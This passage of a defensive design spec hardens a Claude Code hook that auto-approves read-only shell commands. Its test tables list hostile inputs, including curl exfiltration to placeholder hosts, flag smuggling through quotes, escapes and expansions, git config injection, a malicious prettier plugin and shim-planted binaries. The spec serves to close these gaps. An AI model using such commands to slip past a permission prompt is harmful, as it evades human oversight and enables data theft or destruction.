was considered and rejected: it is a global operator config, it cannot be set per-invocation for this purpose (`git -c safe.bareRepository=explicit` is itself a `-c` flag, which falls through), and it breaks legitimate `git -C <bare>` use elsewhere on this machine (ops-toolkit `tools/hermes/scripts/push-mini-branch.sh`, and this suite's own bare-remote fixtures). Writing a config into a repo's own `.git/` still needs prior local file access, at which point code execution is already in hand; the remaining residual is the archive-carried `.git` case: an unpacked real `.git` directory IS a work tree, so the probe passes and the hook can only approve or abstain, never inspect the tree. Recorded, not mitigated. `.gitattributes` can be checked in but only *names* a driver; the driver command itself lives in `.git/config`. A checked-in `.gitattributes` can also select a driver defined in `~/.gitconfig` or another user-level config the repo does not control: the repo supplies the name, not the command, though a common driver name may already exist on the operator's machine (git-lfs additionally reads the checked-in `.lfsconfig`). Low risk; recorded. `git -c`/`-C` overrides fall through (not on the safe-flag list). | Silent at run time: the archive-carried `.git` case is the recorded residual gap with no hook-side detection. The `-c`/`-C` flag path is pinned closed by a40/a41; the bare-layout case is pinned by a54-a56. |
| An approved command name resolves to a shell wrapper instead of the standalone binary the criterion was verified against | The wrapper may rewrite flags or add behavior the man-page check never saw | Observed, not hypothetical: the Claude Code zsh shell snapshot shadows `find` with a `bfs` function (base flags `-S dfs -regextype findutils-default`) and `grep` with a `ugrep` function (base flags `-G --ignore-files --hidden -I --exclude-dir=...`), and interactive rc files alias `ls`, `du`, `df`, `type`. Stage D's "no write-capable option" and `find`'s Stage F flag set were verified against the standalone tools; under a wrapper the same flag text reaches a different parser (e.g. ugrep carries `--save-config`, which writes). The snapshot's own `grep` wrapper reroutes `*config*`/`-save-config`-shaped args to `command grep`, which narrows this specific case but does not close the class. Recorded as an environment assumption: the allowlist pins command TEXT, and what the first word resolves to is the harness's contract, not the hook's. | Silent at run time; detected only by the same kind of audit that found the bfs/ugrep shadowing. |
| A genuinely malicious command built entirely from safe-looking tokens (an unlisted git subcommand, an unlisted tool) | Falls through | Stage E recognizes only the three gated tools (`find`, `git`, `file`) and their named subcommands; any subcommand outside `{status, ls-files, log, diff, show, branch, remote, tag}` for `git`, or any tool outside the Stage D/E tables entirely, never reaches an approve branch. Same "excluded by omission" property the whole design relies on. | The prompt itself: the failure mode IS the visible fall-through. |

A false approve (the direction this spec exists to close) has no runtime signal by
construction: the command runs and nothing is printed. Detection for that direction is the
group-(a) suite plus audit, which is why every live bypass found in ## Problem is kept as a
permanent pin even when the old hook already rejected it by accident.

## Acceptance criteria

- AC1: every command in ## Problem's three tables (the four named cases, the three audit-found
  cases, and the validation-pass cases 5-7) returns no `"allow"` in its output after the fix.
  ## Test plan group (a) is the per-case enumeration of this AC.
- AC2: `git status`, `git log --oneline -5`, and `ls -la` (the pre-existing must-still-approve
  baseline, confirmed live in ## Problem) still return `"allow"` after the fix, along with the
  rest of ## Test plan group (b).
- AC3: the hook never emits a block/deny decision; `tests/test-hooks.sh`'s existing cosmetic-module
  grep assertion (source-level, no deny emitter) still passes unmodified.
- AC4: the hook still exits 0 on every one of the ten `COSMETIC_GARBAGE` malformed-JSON shapes
  already pinned in the cosmetic-module block (fail-closed, never crashes).
- AC5: `sed -i ...` and `sort -o ...` do not auto-approve, and neither `sed` nor `sort` appears
  as a word on any code line of the rewritten hook source (comment lines are skipped, so prose
  cannot trip the check; grep-checkable, pinned by a test).
- AC6: every instrumented fall-through emits its `DWARVES_KIT_DEBUG=1` stderr line carrying
  the stage token (`nul-guard`, `stage-a`, `stage-b`, `stage-c`, `stage-e`, `stage-f`); one
  representative input per stage asserts the token appears on stderr (## Test plan group (c)).

## Test plan

New cases land in `tests/test-hooks.sh`'s existing `=== permission-auto-approve.sh ===` block,
same `OUTPUT=...; assert_output_not_contains "..." '"allow"' "$OUTPUT"` /
`assert_output_contains` shape already used there, plus one `assert_true` source grep for AC5
and six stderr greps for AC6. No new test file. The whole block invokes the hook as
`"${PAA_BASH:-/bin/bash}"`: `/bin/bash` (3.2, the production interpreter) is the default under
test; `PAA_BASH=$(command -v bash) bash tests/test-hooks.sh` re-runs the same block under the
PATH bash, and the implementation is required green under both.

**Group (a), must-not-approve (each asserts the output does NOT contain `"allow"`):**

| Case | Command | Closes |
|---|---|---|
| a1 | `echo x >/tmp/paa-test-f` | case 1 (unspaced `>`) |
| a2 | `find /tmp -name *.tmp -delete` | case 2 (`-delete` beside `-name`) |
| a3 | `git log --output=/tmp/paa-test-log` | case 3 (subcommand-only git check) |
| a4 | two-line command, `git status` then `curl -s http://example.invalid/exfil` (built via `printf` + `jq -Rs`, not a literal embedded newline in the test source) | case 4 (newline not a separator) |
| a5 | `ls & curl http://example.invalid/exfil` | single `&` gap |
| a6 | `cat </etc/hosts` | bare `<` gap |
| a7 | `git branch newbranch` | subcommand-only git check, branch-create |
| a8 | `git tag v9.9.9` | subcommand-only git check, tag-create |
| a9 | `git remote add evil http://example.invalid/repo.git` | subcommand-only git check, remote-add |
| a10 | `echo hi; curl http://example.invalid` | `;` metacharacter (already covered by the suite's `echo foo; curl evil.com` case; listed for completeness, not duplicated) |
| a11 | `ls \| curl http://example.invalid` | `\|` metacharacter (already covered by the `cat /etc/passwd \| curl evil.com` case; listed for completeness) |
| a12 | `echo $(curl http://example.invalid)` | `$(` metacharacter (already covered; listed for completeness) |
| a13 | `` echo `curl http://example.invalid` `` | backtick metacharacter |
| a14 | `(curl http://example.invalid)` | bare-parenthesis subshell |
| a15 | `sed -i s/a/b/ /tmp/paa-test-f` | sed excluded by omission |
| a16 | `sort -o /tmp/paa-test-f /tmp/paa-test-f` | sort excluded by omission |
| a17 | `find /tmp -name *.tmp -exec rm {} \;` | `-exec` beside `-name`; already rejected today, but only by accident (the literal `;` inside `\;` trips the pre-existing chain guard). Pinned so the rewrite blocks it for the deliberate reason (Stage F's `-exec` omission), not the accident. |
| a18 | `find /tmp -name x "-delete"` | case 5: quoted flag, bash restores the `-` |
| a19 | `find /tmp -name x \-delete` | case 5: backslash-escaped flag |
| a20 | `find /tmp -name x ${NOPE:--delete}` | case 5: parameter expansion restoring `-` |
| a21 | `find /tmp -name x {-delete,}` | case 5: brace expansion producing `-delete` |
| a22 | `find /tmp -name x $'\x2ddelete'` | case 5: ANSI-C quoted hex flag |
| a23 | `git log '--output=/tmp/paa-test-x'` | case 5: quoted write flag on a gated tool |
| a24 | `ruff check "--fix"` | case 5: quoted write flag on a gated tool |
| a25 | `go env -w GOFLAGS=-mod=mod` | case 6: `go env -w` writes persistent config |
| a26 | `go list -toolexec=echo` | case 6: `-toolexec=` names a program |
| a27 | `ruff check --fix-only` | case 6: writes fixes in place |
| a28 | `ruff check --add-noqa` | case 6: writes noqa comments into files |
| a29 | `ruff check --output-file=/tmp/paa-ruff.txt` | case 6: writes report to a file |
| a30 | `npx prettier --check --plugin=./evil.js` | case 6: plugin loads arbitrary JS |
| a31 | `file -C -m /tmp/paa-magic` | case 6: `-C` compiles, writes `.mgc` |
| a32 | `find . -name *` | case 7: bare glob in gated-tool args |
| a33 | `git log *` | case 7: bare glob in gated-tool args |
| a34 | `find . -name *.md` | case 7: the former group-(b) case, now must-not-approve because the pattern carries `*` |
| a35 | `cargo check` | dropped approval: writes `target/` and runs build scripts |
| a36 | `python --version` | dropped approval: resolves through a version-manager shim (same class as a50-a52) |
| a37 | `env` | dropped approval: bulk dump of the whole environment with no named target (Decision Log) |
| a38 | `printenv` | dropped approval: same bulk-dump reason |
| a39 | `npx -y prettier --check` | `npx` dropped entirely; this case also pins that `-y` auto-confirm can never ride along |
| a40 | `git -c core.pager=x log` | git global `-c` config injection; `WORDS[1]` is not an allowed subcommand |
| a41 | `git -C /tmp log` | git global `-C` chdir flag; same class |
| a42 | `git log --out=/tmp/paa-test-x2` | unlisted `--out=` write-shaped flag; Stage F excludes by omission (same class as a3) |
| a43 | `pwd -P` | Stage D `pwd` is exact-match; any trailing token falls through |
| a44 | `node --version x` | `node` is dropped as a shim, so no token arrangement on it approves |
| a45 | `npm ls` | dropped approval: npm loads checked-in and command-line config (`.npmrc`, `--registry=`, `--cache=`, `--logs-dir=`) |
| a46 | `npx prettier --check x` | dropped approval: prettier loads checked-in/CLI config and plugins |
| a47 | `ruff check .` | dropped approval: ruff loads checked-in/CLI config (`ruff.toml`, `pyproject.toml`, `--config=`) |
| a48 | `go env` | dropped approval: go reads env/flag config surfaces (`GOFLAGS`, `go env -w`) |
| a49 | `   ` (spaces only, plus an exit-0 assert) | Stage C empty-WORDS guard: `set -u` must not trip, no decision |
| a50 | `node --version` | dropped approval: mise shim honors a checked-in `.tool-versions` (`path:` entry ran a planted binary in review) |
| a51 | `python3 --version` | dropped approval: same mise-shim class |
| a52 | `cargo --version` | dropped approval: rustup proxy honors `rust-toolchain.toml` `path =` |
| a53 | `git status` + `\u0000` + ` tail-token` (JSON escape in the payload, jq decodes to a real NUL byte) | NUL guard: bash `$( )` drops the NUL, so the scanned CMD would differ from the executed string |
| a54 | `git log` with payload `.cwd` = a `git init --bare` fixture dir | the clone-carried bare-repo layout: git discovers the directory itself as a bare repo, so the Stage E work-tree probe prints `false` and the command falls through |
| a55 | `git diff A B` with `.cwd` = a bare layout nested inside a normal repo's subdirectory | the same discovery applies at the nested level; the parent's `.git` never wins |
| a56 | `git status` with `.cwd` = a directory outside any repo | the probe requires an actual work tree, not just a directory that exists |

a25-a31 (the `go`/`ruff`/`npx` flag cases) are now closed twice: the specific write flag was
already unsafe, and the whole tool is dropped from the gated set under the config-loading rule,
so they fall through at Stage E before Stage F's flag table is ever consulted.

**Group (b), must-still-approve (each asserts the output DOES contain `"allow"`, guards against
"fixed by turning every read into a prompt"). Every command the new Stage D/E still approves is
pinned here:**

| Case | Command | Exercises |
|---|---|---|
| b1 | `git status` (already asserted above; unchanged) | Stage D `WORDS[0..1]` match |
| b2 | `git log --oneline -5` (already asserted above; unchanged) | Stage F flag set + `^-[0-9]+$` |
| b3 | `ls -la` (already asserted above; unchanged) | Stage D no-write-option tool |
| b4 | `cat README.md` | Stage D |
| b5 | `find . -name readme.md` | Stage F find flag set, literal pattern (was `*.md`; a bare `*` in gated args is now banned, see case 7) |
| b6 | `git diff --stat` | Stage F git flag set |
| b7 | `git branch -v` | Stage F git branch |
| b8 | `git remote -v` | Stage F git remote |
| b9 | `git tag -l` | Stage F git tag |
| b10 | `git ls-files` | Stage D `WORDS[0..1]` match |
| b11 | `git show` | Stage F git show, zero flags |
| b12 | `pwd` | Stage D exact match |
| b13 | `file README.md` | Stage F file, no flags |
| b14 | `git log -n 5` | Stage F `-n` entry |
| b15 | `git log --format=%h` | Stage F `--format=` prefix; `=` and `%` are Stage-B-legal |
| b16 | `grep -n spec README.md` | Stage D |
| b17 | `echo hello` | Stage D |
| b18 | `head -5 README.md` | Stage D |
| b19 | `tail -5 README.md` | Stage D |
| b20 | `wc -l README.md` | Stage D |
| b21 | `which bash` | Stage D |
| b22 | `type grep` | Stage D |
| b23 | `stat README.md` | Stage D |
| b24 | `du -sh .` | Stage D |
| b25 | `df -h` | Stage D |
| b26 | `git status` with payload `.cwd` = `$KIT_DIR` (a real work tree) | the `.cwd`-driven probe path approves inside a work tree (b1/b2 already pin the `$PWD` fallback, the suite runs inside the repo) |
| b27 | `git log --oneline -5` with payload `.cwd` = `$KIT_DIR` | same, on a Stage-F subcommand |

**Group (c), debug lines (AC6):** six cases, each runs the hook with `DWARVES_KIT_DEBUG=1`,
discards stdout, and asserts stderr carries the pinned stage token. One representative input
per instrumented fall-through:

| Case | Input | Token |
|---|---|---|
| c1 | the a53 `\u0000` payload | `nul-guard` |
| c2 | the a4 two-line payload | `stage-a` |
| c3 | `echo x >/tmp/paa-test-f` | `stage-b` |
| c4 | `   ` (spaces only) | `stage-c` |
| c5 | `curl http://example.com` | `stage-e` |
| c6 | `find /tmp -name *.tmp -delete` | `stage-f` |

**Negative control, run and recorded.** Executed live against the pre-fix
`hooks/permission-auto-approve.sh` (this worktree, before Stage A-F lands) with the new test
cases in place. Result: 40 group-(a) assertions go red, every group (b) assertion stays green
(25/25), and eleven group-(a) assertions pass even pre-fix, each for a documented accidental
reason rather than by design. The six group-(c) debug asserts also go red pre-fix for the
structural reason that the old hook emits no stage lines at all:

| Pre-fix result | Cases | Why |
|---|---|---|
| Red (old hook emits `"allow"`) | a1-a9, a18-a38, a42, a44-a48, a50-a53 | The live bypasses: a18-a24 match the old `^find\b.*-name\b`, `^git\s+...`, `^ruff\s+check` patterns once the text-level `-` is hidden; a25-a31 match `^go`, `^ruff`, `^npx`, `^file`; a32-a34 match `^find`/`^git`; a35-a38 match `^cargo`, `^python3?`, `^env$`, `^printenv`; a42 matches `^git\s+log`; a44, a50-a52 match `^node\s+--version`, `^python3?\s+--version`, `^cargo\s+(--version\|check)` (no end anchor); a45-a48 match `^npm`, `^npx\s+prettier`, `^ruff`, `^go`; a53's NUL is dropped by `$( )`, leaving `git status tail-token`, which matches `^git\s+status`. |
| Green by accident | a13, a14, a15, a16, a17, a39, a40, a41, a43, a49 (two asserts) | a13: backtick was already in the old chain-guard class. a14: bare parens never matched any old prefix. a15/a16: `sed`/`sort` were never whitelisted. a17: caught only because the literal `;` inside `\;` trips the old guard, not because of `-exec`. a39: `npx -y` never matched `^npx\s+prettier`. a40/a41: the old git patterns require an approved subcommand immediately after `^git\s+`, which `-c`/`-C` do not satisfy. a43: `^pwd$` is already exact. a49: spaces match no whitelist prefix; the hook also exits 0 unharmed, so the new guard only has to hold the line, not fix a crash. |

a10-a12 are informational rows only (already covered by the suite's pre-existing
pipe/chain/subshell cases, not duplicated). Every group (a) case is kept as a pin regardless
of whether it already passed pre-fix, so the rewrite closes each one for the deliberate,
documented reason, not by continuing to rely on an accident of the old regex.

## Verification

`bash tests/test-hooks.sh` exits 0, permission-auto-approve section shows the new
group-(a)/group-(b) cases plus the AC5 source grep and the group-(c) debug-line asserts
passing (`PASS` count increases by the number of new assertions listed above, `FAIL` count 0).
The suite is run twice against the permission block: default `PAA_BASH=/bin/bash` (3.2, the
production interpreter) and `PAA_BASH=$(command -v bash)`; both green. Negative controls run
once, live, during implementation via `lib/gate/negctl.sh` (not part of the committed suite):
(1) the pre-fix hook restored over the new tests, expecting the live-bypass portion of group
(a) red (group (c) goes red too, the pre-fix hook has no stage lines); (2) the NUL guard
mutated to `jq contains("\u0000")`, expecting c1/a53 red, on jq >= 1.7 strings retain NULs
and `contains` detects the byte correctly, so on such a toolchain this mutation is
behavior-preserving and the control is expected to report vacuous, recorded verbatim either
way; (3) the NUL guard neutralized (`any(. == 0)` -> `any(. == -1)`), expecting a53/c1 red,
which proves the case has teeth independent of the jq version; (4) the work-tree probe
removed from the hook, expecting the bare-layout a-cases (a54-a56) red.

## Touches

- `hooks/permission-auto-approve.sh`: the Stage A-F rewrite plus the rewritten header comment
  (implementation, next lane phase). The new header describes the staged contract, one line
  per stage, Stage B named as a character allowlist.
- `tests/test-hooks.sh`: the group (a)/(b) cases and the AC5 source grep above, added to the
  existing `=== permission-auto-approve.sh ===` block.
- `docs/FEATURES.md`: regenerate via `bash lib/registry/feature-registry.sh generate` once this
  spec file exists, so the `permission-auto-approve.sh` row's Specs column picks up SPEC-340
  (the generator greps `docs/specs/SPEC-*.md` for the token `permission-auto-approve`; this spec
  mentions it throughout, so no extra marker is needed).
- `hooks/codex-hooks.json` / `lib/codex/repin.sh`: checked, not touched. Neither file references
  `permission-auto-approve.sh`; the sha256 pins in `codex-hooks.json` cover exactly five files
  (`codex-hook-adapter.sh`, `safety-gate.sh`, `ship-gate.sh`, `commit-format.sh`,
  `secrets-guard.sh`), confirmed by grep. `permission-auto-approve.sh` is not part of the Codex
  hard-guardrail spine, so this spec has nothing to repin.
- `hooks.json` / `settings.json` / `anchor-root.sh`: explicitly out of scope for this worktree
  (owned by another branch); not touched, not read for anything beyond the sha-pin check above.

## After state

`hooks/permission-auto-approve.sh` still auto-approves the everyday read-only commands it does
today (Group (b)), and no longer auto-approves any of the write or code-execution shapes found
in ## Problem: the four named cases, the three audit cases, the whole quote/escape/expansion
smuggle class, the per-tool write flags on `go`/`ruff`/`npx`/`file`, and glob-expanded planted
flags. Git commands additionally approve only inside a real work tree: before any git approve
path the hook runs `git -C <payload .cwd, else $PWD> rev-parse --is-inside-work-tree` and
requires an exact `true`, which closes the clone-carried bare-layout case from ## Failure
modes (the archive-carried `.git` case remains the recorded residual). `env`, `printenv`, `cargo check`, `python --version`, the `--version` trio (`node`,
`python3`, `cargo`), `npm`, `npx`, `ruff`, and `go` lose their auto-approval entirely: the last
four and the trio under the config-loading rule (the trio resolve through version-manager
shims; see ## Decision Log); `file` stays in the gated set. The hook still never emits a deny decision; a
command it cannot positively confirm as read-only falls through to the normal Claude Code
permission prompt instead. `sed` and `sort` remain absent from the approved set, unchanged from
today's behavior, now with a regression test proving it stays that way.

Not covered:

- Extending the git `log`/`diff`/`show` safe-flag list to cover more read-only flags
  (`--follow` is the named example). An operator who hits a prompt for a flag they believe is
  safe can propose adding it to the Stage F table in a follow-up; the failure mode is an extra
  prompt, never a silent approval, so there is no urgency to enumerate every git flag up front.
- Re-admitting quoted arguments (`find . -name '*.md'`, `git log --format="%h %s"`). That needs
  a real quote/escape interpreter, the partial-parser shape rejected in ## Design. Possible
  follow-up with its own review; today a quote in the command means a prompt.
- Re-admitting `env`/`printenv` in some narrowed form (e.g. `printenv VAR` for a single named
  variable). A plausible follow-up if the prompts annoy; decided against for now in the
  Decision Log.
- Adding `sed`/`sort` (or any other tool) to the approved set. Explicitly rejected in ## Design;
  a separate, explicitly-scoped follow-up if ever wanted.
- Read-then-send exfiltration. An approved read (`cat`/`grep`/`stat` on a secret file) hands
  the content to the model, and the unconditional `WebFetch` approve lets it leave the host.
  Closing that needs an egress-side control (WebFetch policy), not a Bash-side one; the threat
  model here is writes and code execution, so this is recorded, not attempted.
- Path policy on approved read tools: `cat /proc/...`, `cat ~/.ssh/id_rsa`, `stat`/`du`/`df`
  on sensitive paths still auto-approve. Narrowing which PATHS a read tool may touch is a
  different layer than the character/flag allowlist this spec builds; recorded, not attempted.
- Network side effects of approved reads: on macOS an `ls`/`stat`/`df` under an automounter
  path (`/net/...`, or an autofs-style `/home` map elsewhere) can trigger DNS/NFS lookups.
  The allowlist covers what a command does to local files, not which mount paths it prods.

## Decision Log

- Chose a staged pipeline (single-line, then character allowlist, then tokenize, then
  first-word allowlist, then per-tool safe-flag allowlist) over patching the reported regexes
  in place, after the audit and the validation pass kept finding instances of the identical
  root cause; a denylist patch only ever closes the cases someone happened to name.
- Chose a character allowlist for Stage B over enlarging the character denylist, after the
  validation pass found five characters (`"`, `'`, `\`, `$`, `{}`) the draft's denylist missed,
  each able to rebuild a `-`-flag at run time. The safe character set is small and enumerable;
  the dangerous set is not.
- Chose to reject bare `(`/`)` outright rather than special-case `find`'s escaped-parenthesis
  grouping syntax, since none of the safe `find` flags this spec allows need it; simpler than
  teaching Stage B about escaped versus bare parens for one flag class nobody asked to keep.
  Moot under the character allowlist, which bans both parens anyway; kept for the record.
- Chose explicit per-subcommand flag allowlists for `go`, `ruff`, `npx`, and `file` over flag
  denylists or unrestricted trailing flags, after the validation pass showed each had a
  write-capable or exec-capable flag the draft admitted (`go env -w`, `ruff --fix-only`,
  `npx --plugin=`, `file -C`). Superseded for `go`/`ruff`/`npx` by the config-loading drop
  recorded below; only `file` keeps its flag allowlist.
- Chose to ban `*` in gated-tool args rather than accept glob expansion there: a checked-in
  file named `-delete`/`--fix`/`--output` becomes a live flag on expansion. Stage D tools keep
  `*` because their admission criterion (no write-capable flag exists) makes a planted flag
  harmless.
- Chose to drop `env` and `printenv` from the approved set: both dump the whole environment
  in one invocation, and unlike a targeted read (`cat ~/.aws/credentials` names its target in
  the command text, visible in the prompt the hook bypasses) the bulk dump gives a reviewer
  nothing to weigh. This is a read-surface reduction, not a secrecy guarantee: targeted
  secret reads by Stage-D tools remain approved, and the threat model here is writes and code
  execution (the read-then-send gap is named under `Not covered`). Reversible in a follow-up
  if the prompts annoy (see `Not covered`).
- Chose to drop `cargo check` (writes `target/` and executes `build.rs` build scripts, so it
  was never read-only). Approved by the old regexes; the drop is recorded so the extra prompt
  is explainable. `python --version` moved into the version-manager-shim drop recorded in the
  config-loading entry below.
- Chose to leave `sed`/`sort` off the allowlist entirely (proven by a must-not-approve test and
  the AC5 source grep) rather than add flag-gated entries for them, since neither has ever been
  part of the hook's approved surface; adding new approved tools is out of scope for a
  hardening fix.
- Chose an exact, zero-argument match for `pwd` over allowing trailing flags, carrying forward
  the current hook's existing `^pwd$` exactness rather than loosening it while rewriting
  everything around it.
- Chose to keep the safe-flag lists for `git log`/`diff`/`show` deliberately short (covering the
  pre-existing must-still-approve baseline plus a handful of obviously-safe additions like `-n`)
  rather than exhaustive, and named the gap explicitly in `Not covered`: the cost of an
  unlisted-but-safe flag is one extra prompt, not a security hole, so there is no pressure to
  front-load every git flag.
- Chose to drop `npm`, `npx`, `ruff`, and `go` from the approved set entirely after a second
  review round showed the per-tool flag lists do not converge: every round surfaced another
  config-loading or config-writing flag (`prettier --config=` executes JS, `ruff
  --config=fix=true` and a checked-in `fix = true` rewrite files, `npm --logs-dir=`/`--cache=`
  write, `--registry=` sends requests, `go env -w` persists config). The rule replacing the
  flag lists is categorical: a tool that can load checked-in or command-line config or plugins
  is never auto-approved. A third review round put `node --version`, `python3 --version`,
  `python --version`, and `cargo --version` under the same rule: on this stack `node` and
  `python3` resolve to mise shims and `cargo` to the rustup proxy, and each honors checked-in
  config. Reproduced live: a checked-in `.tool-versions` containing `node path:./ntc` made
  `node --version` execute a planted binary; `rust-toolchain.toml`'s `path =` steers the rustup
  proxy the same way. A version-manager shim is a config-loading tool, so no flag shape is
  enumerated, the whole name is dropped. `git` is the named exception because every config
  surface that can make it run code or write lives in `.git/config` or `.git/hooks`, which git
  never tracks (the archive-carried `.git` case is recorded in ## Failure modes). The dropped
  tools fall through to the normal prompt; recorded so the extra prompts are explainable, and
  reversible per-tool in a follow-up if a config-free invocation class is ever worth scoping.
